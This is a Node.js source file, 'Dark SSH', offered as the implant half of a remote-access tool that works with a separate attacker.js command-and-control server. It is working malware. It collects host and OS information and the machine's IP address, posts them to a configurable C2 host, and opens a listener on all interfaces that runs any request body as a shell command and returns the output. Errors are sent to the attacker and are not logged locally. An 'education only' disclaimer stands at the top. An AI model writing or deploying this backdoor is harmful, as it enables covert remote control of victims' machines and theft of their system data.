/**
 * => [: Dark SSH :] <=
 * 
 * Warning: this is for education purpose only and shouldn't be used on a system or computer you don't own.
 * this file contain's the executable file that act as the malware or ssh server.
 * Note: by default this code assume you're running it on same machine the attacker.js file is running on. if you want to run it on different machine kindly replace the [host] const variable to the ipaddress the attacker.js file is running on.
 */

// import http module
const http = require('http');
// import is module
const os = require('os');
// import child_process and destruct exec
const { exec } = require('child_process');

const host = '127.0.0.1'; // replace with your real c2 server ipaddress 
const port = 1146; // replace with your actual host port  Note: the port number in your attacker.js file must be same.

// generate random port number.
const Rport = Math.floor(Math.random() * 6000) + 5000;

// create an object variable to hold data about the os.
let OS = {};


  // store as much os info as possible with an loop.
 Object.keys(os).forEach(key => {
 	// the setPriority was causing an error so we have to remove it besides it's a setter not a getter.
 	if(typeof os[key] === 'function' && key !==  'setPriority'){
 		// store data to the OS object
      OS[key] = os[key]();
 	}
 });
 
 // payload to be sent.
 let payload = {
      	"target-port": Rport,
      	"os-info": OS,
      	"operating-system": process.platform,
      	"ipaddress": getIPAddress()
      }
// http options
const options = {
   	  host: host,
      port: port,
      path: '/',
      method: 'POST',
      headers: {
      	'content-type': 'application/json'
      }
   }
 // variable to keep track of re-tries
let notifierTry = 0;
 /**
  * notifier function.
  * 
  * this function notify the attack host or the ssh client via http request.
  */
function notifier() {
// send request
var req = http.request(options, (res) => {
	// if request is ok then return
	 if(res.statusCode === 200) return;
	 // if request is not ok the retry
	 if(notifierTry <= 4){
		notifierTry++;
		notifier();
	}
	// handle error if error the retry
	res.on('error', (error) => {
         	if(notifierTry <= 4){
		notifierTry++;
		notifier();
           	}
         });
});

// send payload to host
req.write(JSON.stringify(payload));

// handle error / retry
req.on('error', () => {
	if(notifierTry <= 4){
		notifierTry++;
		notifier();
	}
});

// always end request.
req.end();

}

/**
 * call the notifier function it's similar to tell the host that the code executed successful.
 */
notifier();

/**
 * create an http server that act as remote shell for the host to access.
 */
http.createServer((req, res) => {
	// variable to hold body
	let body = '';
	// and also for payload
	let playload;
	// handle request body
	 req.on('data', (chunk) => {
	 	body += chunk.toString();
	 });
	 // once ended
	 req.on('end', () => {
	 	// assigning body to payload
	 	payload = body;
	 	// call handlePlayload function with payload and the response object as parameters.
	 	handlePlayload(payload, res);
	 })
}).listen(Rport, '0.0.0.0'); // listen to the random port.


/**
 * the handlePlayload function.
 * 
 * this were things get interesting by handing payload from attack host(c2 server) or ssh client
 */
function handlePlayload(payload, res){
// execute payload with the exec nodejs os module.
exec(payload, (error, stdout, stderr) => {
	// handle exec function error and make sure any error is not logged here (the ssh server or the machine you're running the code).
  if (error) {
  	 res.writeHead(500, {'content-type': 'text/plain'});
  	 // send the error to the host instead.
     res.end(error.message);
     // and return
    return;
  }
  
  // tell c2 server or ssh client everything is ok
   res.writeHead(200, {'content-type': 'text/plain'});
   // send stdout and stderr if available as response
   res.end(`${stderr ? stderr + "\n" :  ''}${stdout}`);
 
});

}


function getIPAddress() {
  const interfaces = os.networkInterfaces();
  for (const name of Object.keys(interfaces)) {
    for (const iface of interfaces[name]) {
      // Skip internal (127.0.0.1) and non-IPv4 addresses
      if (iface.family === 'IPv4' && !iface.internal) {
        return iface.address;
      }
    }
  }
  // if no result use the loop-back address instead
  return '127.0.0.1';
}
